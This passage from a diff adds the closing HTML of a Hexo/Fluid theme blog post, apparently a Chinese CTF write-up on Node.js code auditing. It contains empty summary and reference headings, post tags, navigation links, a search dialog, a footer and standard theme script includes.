payload).content)<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/nodejs/">nodejs</a>
+                    
+                      <a class="hover-with-bg" href="/tags/nodejs%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">nodejs代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/27/2021%E7%A5%A5%E4%BA%91%E6%9D%AFcralwer-z/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2021祥云杯cralwer_z</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/24/Netcat/">
+                        <span class="hidden-mobile">Netcat</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
